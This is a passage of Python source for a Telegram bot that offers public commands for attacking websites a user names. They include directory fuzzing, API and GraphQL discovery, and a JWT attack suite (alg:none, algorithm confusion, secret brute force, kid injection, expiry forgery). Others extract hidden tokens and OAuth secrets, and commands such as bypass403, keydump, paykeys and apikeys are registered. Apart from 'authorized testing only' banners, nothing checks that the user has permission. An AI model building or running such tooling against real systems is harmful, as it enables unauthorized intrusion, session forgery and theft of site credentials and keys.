        result = await asyncio.to_thread(_vuln_scan_sync, url, progress_q)
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ Scan error: `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()
    report = _format_vuln_report(result)
    try:
        await msg.edit_text(report[:4000], parse_mode='Markdown')
    except BadRequest:
        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')


async def cmd_api(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/api <url> — Discover API endpoints (Swagger, GraphQL, Next.js routes)"""
    if not await check_force_join(update, context): return
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/api https://example.com`\n\n"
            "🔍 *Discovers:*\n"
            "  • Swagger / OpenAPI specs\n"
            "  • GraphQL introspection\n"
            "  • Next.js route manifest\n"
            "  • API endpoints from HTML + JS\n\n"
            "⚠️ _Authorized testing only._",
            parse_mode='Markdown')
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return
    url = context.args[0].strip()
    if not url.startswith('http'): url = 'https://' + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return
    domain = urlparse(url).netloc
    msg = await update.effective_message.reply_text(
        f"🔍 *API Scan — `{domain}`*\n\n⏳ Fetching specs + probing endpoints...", parse_mode='Markdown')
    progress_q = []
    async def _prog():
        while True:
            await asyncio.sleep(3)
            if progress_q:
                t = progress_q[-1]; progress_q.clear()
                try: await msg.edit_text(f"🔍 *API Scan — `{domain}`*\n\n{t}", parse_mode='Markdown')
                except: pass
    prog = asyncio.create_task(_prog())
    try:
        result = await asyncio.to_thread(_endpoints_sync, url, lambda t: progress_q.append(t))
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()
    if result.get("error"):
        await msg.edit_text(f"❌ `{result['error']}`", parse_mode='Markdown')
        return
    findings = result["findings"]
    gql      = result.get("graphql", {})
    swagger  = result.get("swagger", [])
    next_r   = result.get("next_routes", [])
    lines = [f"🔍 *API Scan — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━",
             f"📡 Endpoints found: `{len(findings)}`",
             f"📄 OpenAPI specs: `{len(swagger)}`",
             f"🔮 GraphQL: `{'✅ Exposed' if gql.get('vulnerable') else '❌ Not found'}`",
             f"📦 Next.js routes: `{len(next_r)}`", ""]
    if gql.get("vulnerable"):
        lines.append(f"*🔮 GraphQL:* `{gql['endpoint']}`")
        lines.append(f"  Types: `{'`, `'.join(gql.get('types', [])[:8])}`")
        lines.append("")
    if swagger:
        lines.append("*📄 OpenAPI Specs:*")
        for s in swagger[:3]:
            lines.append(f"  • `{s['spec_url']}`  ({len(s.get('endpoints', []))} endpoints)")
        lines.append("")
    by_type = {}
    for f in findings:
        by_type.setdefault(f["type"], []).append(f["endpoint"])
    for t, eps in list(by_type.items())[:8]:
        lines.append(f"*{t}* (`{len(eps)}`):")
        for ep in eps[:5]:
            lines.append(f"  `{ep[:80]}`")
        lines.append("")
    lines.append("⚠️ _Authorized testing only_")
    report = "\n".join(lines)
    try:
        await msg.edit_text(report[:4000], parse_mode='Markdown')
    except BadRequest:
        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')


async def cmd_fuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/fuzz <url> [mode] — Directory/file fuzzer (modes: common, api, backup, admin)"""
    if not await check_force_join(update, context): return
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/fuzz https://example.com [mode]`\n\n"
            "🧪 *Modes:*\n"
            "  `common` — common paths (default)\n"
            "  `api`    — API endpoints\n"
            "  `backup` — backup files (.bak, .old…)\n"
            "  `admin`  — admin panels\n\n"
            "⚠️ _Authorized testing only._",
            parse_mode='Markdown')
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return
    url  = context.args[0].strip()
    mode = context.args[1].strip().lower() if len(context.args) > 1 else "common"
    if not url.startswith('http'): url = 'https://' + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return
    domain = urlparse(url).netloc
    msg = await update.effective_message.reply_text(
        f"🧪 *Fuzzing — `{domain}`* (`{mode}` mode)\n\n⏳ Starting...", parse_mode='Markdown')
    progress_q = []
    async def _prog():
        while True:
            await asyncio.sleep(3)
            if progress_q:
                t = progress_q[-1]; progress_q.clear()
                try: await msg.edit_text(f"🧪 *Fuzzing — `{domain}`*\n\n{t}", parse_mode='Markdown')
                except: pass
    prog = asyncio.create_task(_prog())
    try:
        found, baseline = await asyncio.to_thread(_fuzz_sync, url, mode, progress_q)
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()
    if not found:
        await msg.edit_text(
            f"🧪 *Fuzzer — `{domain}`*\n\n📭 No interesting paths found.\n"
            f"_(Baseline: `{baseline}`)_", parse_mode='Markdown')
        return
    lines = [f"🧪 *Fuzzer — `{domain}`* (`{mode}`)", "━━━━━━━━━━━━━━━━━━━━",
             f"✅ Found: `{len(found)}` paths\n"]
    for h in found[:30]:
        icon = "🔓" if not h.get("gated") else "🔒"
        lines.append(f"{icon} `{h['status']}` `{h['url'].replace(url, '')[:60]}` ({h['size']}B)")
    if len(found) > 30:
        lines.append(f"\n_…and `{len(found)-30}` more_")
    lines.append("\n⚠️ _Authorized testing only_")
    report = "\n".join(lines)
    try:
        await msg.edit_text(report[:4000], parse_mode='Markdown')
    except BadRequest:
        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')


async def cmd_smartfuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/smartfuzz <url> — AI-assisted smart fuzzer (crawls page to build custom wordlist)"""
    if not await check_force_join(update, context): return
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/smartfuzz https://example.com`\n\n"
            "🤖 *Smart Fuzzer:*\n"
            "  • Crawls target page to extract keywords\n"
            "  • Builds custom wordlist from JS/HTML\n"
            "  • Probes with backup extension variants\n"
            "  • Response-diff filtering (no false positives)\n\n"
            "⚠️ _Authorized testing only._",
            parse_mode='Markdown')
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return
    url = context.args[0].strip()
    if not url.startswith('http'): url = 'https://' + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return
    domain = urlparse(url).netloc
    msg = await update.effective_message.reply_text(
        f"🤖 *SmartFuzz — `{domain}`*\n\n⏳ Crawling page to build wordlist...", parse_mode='Markdown')
    progress_q = []
    async def _prog():
        while True:
            await asyncio.sleep(3)
            if progress_q:
                t = progress_q[-1]; progress_q.clear()
                try: await msg.edit_text(f"🤖 *SmartFuzz — `{domain}`*\n\n{t}", parse_mode='Markdown')
                except: pass
    prog = asyncio.create_task(_prog())
    try:
        def _run():
            try:
                r = requests.get(url, timeout=10, verify=False, headers=_get_headers(),
                                 proxies=proxy_manager.get_proxy())
                words = list(dict.fromkeys(re.findall(r'/([a-zA-Z0-9_\-]{3,30})', r.text)))[:200]
            except Exception:
                words = ["api", "admin", "login", "user", "config", "static", "assets"]
            progress_q.append(f"🧠 Wordlist built: `{len(words)}` words — probing...")
            return _smartfuzz_probe_sync(url, words, lambda t: progress_q.append(t))
        found = await asyncio.to_thread(_run)
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()
    if not found:
        await msg.edit_text(f"🤖 *SmartFuzz — `{domain}`*\n\n📭 No interesting paths found.", parse_mode='Markdown')
        return
    lines = [f"🤖 *SmartFuzz — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━",
             f"✅ Found: `{len(found)}` paths\n"]
    for h in found[:30]:
        icon = "🔓" if not h.get("gated") else "🔒"
        lines.append(f"{icon} `{h['status']}` `/{h['word']}` ({h['size']}B)")
    if len(found) > 30:
        lines.append(f"\n_…and `{len(found)-30}` more_")
    lines.append("\n⚠️ _Authorized testing only_")
    try:
        await msg.edit_text("\n".join(lines)[:4000], parse_mode='Markdown')
    except BadRequest:
        await update.effective_message.reply_text("\n".join(lines)[:4000], parse_mode='Markdown')


async def cmd_jwtattack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/jwtattack <token> — JWT attack suite (none alg, alg confusion, brute force, kid injection)"""
    if not await check_force_join(update, context): return
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/jwtattack <JWT_token>`\n\n"
            "🔐 *Attacks performed:*\n"
            "  • Decode header + payload\n"
            "  • `alg:none` bypass\n"
            "  • Algorithm confusion (RS256→HS256)\n"
            "  • Secret brute-force (common wordlist)\n"
            "  • `kid` header injection\n"
            "  • Expiry forgery\n\n"
            "⚠️ _Authorized testing only._",
            parse_mode='Markdown')
        return
    token = context.args[0].strip()
    if not token.startswith("eyJ"):
        await update.effective_message.reply_text(
            "❌ Not a valid JWT — must start with `eyJ`", parse_mode='Markdown')
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return
    msg = await update.effective_message.reply_text("🔐 *JWT Attack Suite*\n\n⏳ Running attacks...", parse_mode='Markdown')
    def _run():
        decoded   = _jwt_decode_payload(token)
        none_atk  = _jwt_none_attack(token)
        alg_atk   = _jwt_alg_confusion(token)
        brute_atk = _jwt_brute_force(token)
        kid_atk   = _jwt_kid_injection(token)
        exp_atk   = _jwt_exp_forgery(token)
        return decoded, none_atk, alg_atk, brute_atk, kid_atk, exp_atk
    try:
        decoded, none_atk, alg_atk, brute_atk, kid_atk, exp_atk = await asyncio.to_thread(_run)
    except Exception as e:
        await msg.edit_text(f"❌ `{e}`", parse_mode='Markdown')
        return
    lines = ["🔐 *JWT Attack Report*", "━━━━━━━━━━━━━━━━━━━━"]
    if not decoded.get("error"):
        hdr = decoded.get("header", {})
        pay = decoded.get("payload", {})
        lines += [f"*Algorithm:* `{hdr.get('alg','?')}`",
                  f"*Subject:* `{pay.get('sub', pay.get('user_id', '–'))}`",
                  f"*Issuer:* `{pay.get('iss','–')}`",
                  f"*Expires:* `{pay.get('exp','–')}`", ""]
    lines.append(f"🔓 *alg:none* — {'✅ VULNERABLE' if none_atk.get('success') else '❌ Blocked'}")
    lines.append(f"🔀 *Alg Confusion* — {'✅ Token crafted' if alg_atk.get('success') else '❌ N/A'}")
    if brute_atk.get("cracked"):
        lines.append(f"💥 *Brute Force* — ✅ Secret: `{brute_atk['secret']}`")
    else:
        lines.append("🔑 *Brute Force* — ❌ Not cracked")
    lines.append(f"💉 *kid Injection* — {'✅ Payloads generated' if kid_atk.get('success') else '❌ No kid header'}")
    lines.append(f"⏰ *Exp Forgery* — {'✅ Token crafted' if exp_atk.get('success') else '❌ N/A'}")
    lines.append("\n⚠️ _Authorized testing only_")
    try:
        await msg.edit_text("\n".join(lines)[:4000], parse_mode='Markdown')
    except BadRequest:
        await update.effective_message.reply_text("\n".join(lines)[:4000], parse_mode='Markdown')


async def cmd_hiddenkeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/hiddenkeys <url> — Extract hidden CSRF tokens, nonces, meta tokens from DOM"""
    if not await check_force_join(update, context): return
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/hiddenkeys https://example.com`\n\n"
            "🔑 *Extracts:*\n"
            "  • CSRF / XSRF tokens (22 frameworks)\n"
            "  • Meta tag tokens + CSP nonces\n"
            "  • Hidden form inputs\n"
            "  • localStorage / sessionStorage tokens\n"
            "  • Service worker keys\n\n"
            "⚠️ _Authorized testing only._",
            parse_mode='Markdown')
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return
    url = context.args[0].strip()
    if not url.startswith('http'): url = 'https://' + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return
    domain = urlparse(url).netloc
    msg = await update.effective_message.reply_text(
        f"🔑 *Hidden Keys — `{domain}`*\n\n⏳ Scanning DOM...", parse_mode='Markdown')
    progress_q = []
    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_q:
                t = progress_q[-1]; progress_q.clear()
                try: await msg.edit_text(f"🔑 *Hidden Keys — `{domain}`*\n\n{t}", parse_mode='Markdown')
                except: pass
    prog = asyncio.create_task(_prog())
    try:
        result = await asyncio.to_thread(_hiddenkeys_sync, url, lambda t: progress_q.append(t))
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()
    if result.get("error"):
        await msg.edit_text(f"❌ `{result['error']}`", parse_mode='Markdown')
        return
    findings = result["findings"]
    if not findings:
        await msg.edit_text(f"🔑 *Hidden Keys — `{domain}`*\n\n📭 No hidden tokens found.", parse_mode='Markdown')
        return
    lines = [f"🔑 *Hidden Keys — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━",
             f"✅ Found: `{len(findings)}`\n"]
    for i, f in enumerate(findings[:25], 1):
        lines.append(f"*[{i}]* `{f['type']}`")
        lines.append(f"  Name: `{f.get('name','–')[:40]}`")
        lines.append(f"  Value: `{f['value'][:60]}`")
        lines.append(f"  _Source: {f.get('source','')[:40]}_\n")
    lines.append("⚠️ _Authorized testing only_")
    try:
        await msg.edit_text("\n".join(lines)[:4000], parse_mode='Markdown')
    except BadRequest:
        await update.effective_message.reply_text("\n".join(lines)[:4000], parse_mode='Markdown')


async def cmd_endpoints(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/endpoints <url> — Discover all API endpoints from JS, Swagger, GraphQL, Next.js"""
    if not await check_force_join(update, context): return
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/endpoints https://example.com`\n\n"
            "📡 *Discovers API endpoints from:*\n"
            "  • Inline + external JavaScript\n"
            "  • Swagger / OpenAPI specs\n"
            "  • GraphQL introspection\n"
            "  • Next.js build manifest\n"
            "  • Network requests (Playwright)\n\n"
            "⚠️ _Authorized testing only._",
            parse_mode='Markdown')
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return
    url = context.args[0].strip()
    if not url.startswith('http'): url = 'https://' + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return
    domain = urlparse(url).netloc
    msg = await update.effective_message.reply_text(
        f"📡 *Endpoint Discovery — `{domain}`*\n\n⏳ Scanning...", parse_mode='Markdown')
    progress_q = []
    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_q:
                t = progress_q[-1]; progress_q.clear()
                try: await msg.edit_text(f"📡 *Endpoints — `{domain}`*\n\n{t}", parse_mode='Markdown')
                except: pass
    prog = asyncio.create_task(_prog())
    try:
        result = await asyncio.to_thread(_endpoints_sync, url, lambda t: progress_q.append(t))
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()
    if result.get("error"):
        await msg.edit_text(f"❌ `{result['error']}`", parse_mode='Markdown')
        return
    findings = result["findings"]
    if not findings:
        await msg.edit_text(f"📡 *Endpoints — `{domain}`*\n\n📭 No endpoints found.", parse_mode='Markdown')
        return
    lines = [f"📡 *Endpoints — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━",
             f"✅ Found: `{len(findings)}`\n"]
    by_type = {}
    for f in findings:
        by_type.setdefault(f["type"], []).append(f["endpoint"])
    for t, eps in list(by_type.items())[:10]:
        lines.append(f"*{t}* (`{len(eps)}`):")
        for ep in eps[:6]:
            lines.append(f"  `{ep[:80]}`")
        lines.append("")
    lines.append("⚠️ _Authorized testing only_")
    try:
        await msg.edit_text("\n".join(lines)[:4000], parse_mode='Markdown')
    except BadRequest:
        await update.effective_message.reply_text("\n".join(lines)[:4000], parse_mode='Markdown')


async def cmd_oauthscan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/oauthscan <url> — OAuth/OIDC misconfiguration scanner"""
    if not await check_force_join(update, context): return
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/oauthscan https://example.com`\n\n"
            "🔐 *Scans for:*\n"
            "  • Exposed client_id / client_secret\n"
            "  • Dangerous redirect_uri values\n"
            "  • Missing PKCE / state param (CSRF risk)\n"
            "  • Implicit flow tokens in URL fragment\n"
            "  • Open token endpoints\n\n"
            "⚠️ _Authorized testing only._",
            parse_mode='Markdown')
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return
    url = context.args[0].strip()
    if not url.startswith('http'): url = 'https://' + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return
    domain = urlparse(url).netloc
    msg = await update.effective_message.reply_text(
        f"🔐 *OAuth Scan — `{domain}`*\n\n⏳ Scanning...", parse_mode='Markdown')
    progress_q = []
    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_q:
                t = progress_q[-1]; progress_q.clear()
                try: await msg.edit_text(f"🔐 *OAuth Scan — `{domain}`*\n\n{t}", parse_mode='Markdown')
                except: pass
    prog = asyncio.create_task(_prog())
    try:
        result = await asyncio.to_thread(_oauthscan_sync, url, lambda t: progress_q.append(t))
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()
    if result.get("error"):
        await msg.edit_text(f"❌ `{result['error']}`", parse_mode='Markdown')
        return
    findings = result["findings"]
    risks    = result.get("risks", [])
    if not findings and not risks:
        await msg.edit_text(f"🔐 *OAuth Scan — `{domain}`*\n\n📭 No OAuth artifacts found.", parse_mode='Markdown')
        return
    lines = [f"🔐 *OAuth Scan — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━",
             f"✅ Found: `{len(findings)}` | ⚠️ Risks: `{len(risks)}`\n"]
    if risks:
        lines.append("*⚠️ Risk Findings:*")
        for r in risks[:5]:
            lines.append(f"  🟠 `{r}`")
        lines.append("")
    for i, f in enumerate(findings[:20], 1):
        lines.append(f"*[{i}]* `{f['type']}`")
        lines.append(f"  `{f['value'][:80]}`")
        if f.get("risk"):
            lines.append(f"  ⚠️ `{f['risk']}`")
        lines.append("")
    lines.append("⚠️ _Authorized testing only_")
    try:
        await msg.edit_text("\n".join(lines)[:4000], parse_mode='Markdown')
    except BadRequest:
        await update.effective_message.reply_text("\n".join(lines)[:4000], parse_mode='Markdown')


# ── Admin handlers ────────────────────────────────────────────────────

@admin_only
async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/admin — Admin panel"""
    if update.effective_chat.type != "private":
        await update.effective_message.reply_text("🔒 Private chat only.")
        return
    db = await db_read()
    await _send_admin_panel(update.effective_message, db)


@admin_only
async def cmd_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/ban <user_id> — Ban a user"""
    if not context.args:
        await update.effective_message.reply_text("📌 Usage: `/ban <user_id>`", parse_mode='Markdown')
        return
    try:
        target = int(context.args[0])
    except ValueError:
        await update.effective_message.reply_text("❌ Invalid user ID.", parse_mode='Markdown')
        return
    async with db_lock:
        db = _load_db_sync()
        if str(target) not in db["users"]:
            await update.effective_message.reply_text(f"❌ User `{target}` not found.", parse_mode='Markdown')
            return
        db["users"][str(target)]["banned"] = True
        _save_db_sync(db)
    await update.effective_message.reply_text(f"🚫 User `{target}` banned.", parse_mode='Markdown')


@admin_only
async def cmd_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/unban <user_id> — Unban a user"""
    if not context.args:
        await update.effective_message.reply_text("📌 Usage: `/unban <user_id>`", parse_mode='Markdown')
        return
    try:
        target = int(context.args[0])
    except ValueError:
        await update.effective_message.reply_text("❌ Invalid user ID.", parse_mode='Markdown')
        return
    async with db_lock:
        db = _load_db_sync()
        if str(target) not in db["users"]:
            await update.effective_message.reply_text(f"❌ User `{target}` not found.", parse_mode='Markdown')
            return
        db["users"][str(target)]["banned"] = False
        _save_db_sync(db)
    await update.effective_message.reply_text(f"✅ User `{target}` unbanned.", parse_mode='Markdown')


@admin_only
async def cmd_setlimit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/setlimit global <n> | /setlimit <user_id> <n> — Set daily download limit"""
    if len(context.args) < 2:
        await update.effective_message.reply_text(
            "📌 Usage:\n`/setlimit global <n>` — set global limit\n"
            "`/setlimit <user_id> <n>` — set per-user limit", parse_mode='Markdown')
        return
    try:
        n = int(context.args[1])
    except ValueError:
        await update.effective_message.reply_text("❌ Limit must be a number.", parse_mode='Markdown')
        return
    async with db_lock:
        db = _load_db_sync()
        if context.args[0].lower() == "global":
            db["settings"]["global_daily_limit"] = n
            _save_db_sync(db)
            await update.effective_message.reply_text(f"✅ Global daily limit set to `{n}`.", parse_mode='Markdown')
        else:
            try:
                uid = int(context.args[0])
            except ValueError:
                await update.effective_message.reply_text("❌ Invalid user ID.", parse_mode='Markdown')
                return
            if str(uid) not in db["users"]:
                await update.effective_message.reply_text(f"❌ User `{uid}` not found.", parse_mode='Markdown')
                return
            db["users"][str(uid)]["custom_limit"] = n
            _save_db_sync(db)
            await update.effective_message.reply_text(f"✅ User `{uid}` limit set to `{n}`.", parse_mode='Markdown')


@admin_only
async def cmd_userinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/userinfo <user_id> — Show user info"""
    if not context.args:
        await update.effective_message.reply_text("📌 Usage: `/userinfo <user_id>`", parse_mode='Markdown')
        return
    try:
        target = int(context.args[0])
    except ValueError:
        await update.effective_message.reply_text("❌ Invalid user ID.", parse_mode='Markdown')
        return
    db = await db_read()
    u  = db["users"].get(str(target))
    if not u:
        await update.effective_message.reply_text(f"❌ User `{target}` not found.", parse_mode='Markdown')
        return
    today   = str(date.today())
    lines = [
        f"👤 *User Info — `{target}`*",
        f"Name: `{u.get('name','–')}`",
        f"Banned: `{'Yes 🚫' if u.get('banned') else 'No ✅'}`",
        f"Total DLs: `{u.get('total_downloads', 0)}`",
        f"Today DLs: `{u.get('count_today', 0)}`",
        f"Last active: `{u.get('last_date', '–')}`",
        f"Custom limit: `{u.get('custom_limit', 'default')}`",
    ]
    await update.effective_message.reply_text("\n".join(lines), parse_mode='Markdown')


@admin_only
async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/broadcast <message> — Broadcast message to all users"""
    if not context.args:
        await update.effective_message.reply_text("📌 Usage: `/broadcast <message>`", parse_mode='Markdown')
        return
    text = " ".join(context.args)
    db   = await db_read()
    uids = list(db["users"].keys())
    msg  = await update.effective_message.reply_text(f"📢 Broadcasting to `{len(uids)}` users...", parse_mode='Markdown')
    ok = fail = 0
    for uid_str in uids:
        try:
            await context.bot.send_message(chat_id=int(uid_str), text=f"📢 *Broadcast:*\n\n{text}", parse_mode='Markdown')
            ok += 1
        except Exception:
            fail += 1
        await asyncio.sleep(0.05)
    await msg.edit_text(f"✅ Sent: `{ok}` | ❌ Failed: `{fail}`", parse_mode='Markdown')


@admin_only
async def cmd_allusers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/allusers — List all registered users"""
    db    = await db_read()
    users = list(db["users"].items())
    if not users:
        await update.effective_message.reply_text("👥 No users registered yet.", parse_mode='Markdown')
        return
    lines = [f"👥 *All Users ({len(users)}):*\n"]
    for uid_str, u in users[:50]:
        icon = "🚫" if u.get("banned") else "✅"
        lines.append(f"{icon} `{uid_str}` — {u.get('name','?')} | {u.get('total_downloads',0)} DL")
    if len(users) > 50:
        lines.append(f"\n_…and {len(users)-50} more_")
    await update.effective_message.reply_text("\n".join(lines), parse_mode='Markdown')


@admin_only
async def cmd_setpages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/setpages <n> — Set max pages per crawl"""
    if not context.args:
        await update.effective_message.reply_text("📌 Usage: `/setpages <n>`", parse_mode='Markdown')
        return
    try:
        n = int(context.args[0])
    except ValueError:
        await update.effective_message.reply_text("❌ Must be a number.", parse_mode='Markdown')
        return
    async with db_lock:
        db = _load_db_sync()
        db["settings"]["max_pages"] = n
        _save_db_sync(db)
    await update.effective_message.reply_text(f"✅ Max pages set to `{n}`.", parse_mode='Markdown')


@admin_only
async def cmd_setassets(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/setassets <n> — Set max assets per download"""
    if not context.args:
        await update.effective_message.reply_text("📌 Usage: `/setassets <n>`", parse_mode='Markdown')
        return
    try:
        n = int(context.args[0])
    except ValueError:
        await update.effective_message.reply_text("❌ Must be a number.", parse_mode='Markdown')
        return
    async with db_lock:
        db = _load_db_sync()
        db["settings"]["max_assets"] = n
        _save_db_sync(db)
    await update.effective_message.reply_text(f"✅ Max assets set to `{n}`.", parse_mode='Markdown')


@admin_only
async def cmd_setforcejoin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/setforcejoin <@channel|off> — Require channel membership before using bot"""
    if not context.args:
        await update.effective_message.reply_text(
            "📌 Usage:\n`/setforcejoin @channel` — enable\n`/setforcejoin off` — disable",
            parse_mode='Markdown')
        return
    val = context.args[0].strip()
    async with db_lock:
        db = _load_db_sync()
        if val.lower() == "off":
            db["settings"]["force_join"] = None
            _save_db_sync(db)
            await update.effective_message.reply_text("✅ Force-join disabled.", parse_mode='Markdown')
        else:
            channel = val if val.startswith("@") else "@" + val
            db["settings"]["force_join"] = channel
            _save_db_sync(db)
            await update.effective_message.reply_text(
                f"✅ Force-join enabled: `{channel}`\n"
                "Make sure the bot is an admin in that channel.", parse_mode='Markdown')


# ══════════════════════════════════════════════════
# 🚀  MAIN
# ══════════════════════════════════════════════════

def main():
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("═"*55)
        print("❌  .env file ထဲ TOKEN ထည့်ဖို့ မမေ့ပါနဲ့")
        print()
        print("1. .env file create လုပ်ပါ:")
        print("   nano .env")
        print()
        print("2. ဒါတွေ ထည့်ပါ:")
        print("   BOT_TOKEN=your_token_here")
        print("   ADMIN_IDS=your_telegram_id")
        print("   SECRET_KEY=any_random_string_here")
        print()
        print("3. ID မသိရင်: @userinfobot → /start")
        print()
        print("JS Support:")
        print("  pip install playwright")
        print("  playwright install chromium")
        print("═"*55)
        return


    # ── Build app with extended timeouts for Termux ───
    request = HTTPXRequest(
        connection_pool_size   = 8,
        connect_timeout        = 30.0,
        read_timeout           = 30.0,
        write_timeout          = 30.0,
        pool_timeout           = 30.0,
    )
    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .request(request)
        .build()
    )

    # ── Init asyncio primitives (event loop must be running) ─
    global download_semaphore, db_lock, _dl_queue
    download_semaphore = asyncio.Semaphore(MAX_WORKERS)
    db_lock            = asyncio.Lock()
    _dl_queue          = asyncio.Queue(maxsize=QUEUE_MAX)

    # ── Web commands ─────────────────────────────────
    app.add_handler(CommandHandler("start",          cmd_start))
    app.add_handler(CommandHandler("help",           cmd_help))
    app.add_handler(CommandHandler("download",       cmd_download))
    app.add_handler(CommandHandler("fullsite",       cmd_fullsite))
    app.add_handler(CommandHandler("jsdownload",     cmd_jsdownload))
    app.add_handler(CommandHandler("jsfullsite",     cmd_jsfullsite))
    app.add_handler(CommandHandler("resume",         cmd_resume))
    app.add_handler(CommandHandler("stop",            cmd_stop))
    app.add_handler(CommandHandler("status",         cmd_status))
    app.add_handler(CommandHandler("history",        cmd_history))
    app.add_handler(CommandHandler("vuln",           cmd_vuln))
    app.add_handler(CommandHandler("api",            cmd_api))
    app.add_handler(CommandHandler("tech",           cmd_tech))
    app.add_handler(CommandHandler("extract",        cmd_extract))
    app.add_handler(CommandHandler("monitor",        cmd_monitor))
    app.add_handler(CommandHandler("bypass403",      cmd_bypass403))
    app.add_handler(CommandHandler("subdomains",     cmd_subdomains))
    app.add_handler(CommandHandler("fuzz",           cmd_fuzz))
    # ── New Feature Commands ──────────────────────────
    app.add_handler(CommandHandler("setforcejoin",   cmd_setforcejoin))
    app.add_handler(CommandHandler("appassets",      cmd_appassets))
    app.add_handler(CommandHandler("antibot",        cmd_antibot))
    app.add_handler(CommandHandler("smartfuzz",      cmd_smartfuzz))
    app.add_handler(CommandHandler("jwtattack",      cmd_jwtattack))
    app.add_handler(CommandHandler("keydump",        cmd_keydump))
    app.add_handler(CommandHandler("kdexport",       cmd_kdexport))
    app.add_handler(CommandHandler("sitekey",        cmd_sitekey))
    # ── Key Extractor commands ────────────────────────
    app.add_handler(CommandHandler("apikeys",         cmd_apikeys))
    app.add_handler(CommandHandler("firebase",        cmd_firebase))
    app.add_handler(CommandHandler("paykeys",         cmd_paykeys))
    app.add_handler(CommandHandler("socialkeys",      cmd_socialkeys))
    app.add_handler(CommandHandler("analytics",       cmd_analytics))
    app.add_handler(CommandHandler("hiddenkeys",      cmd_hiddenkeys))
    app.add_handler(CommandHandler("endpoints",       cmd_endpoints))
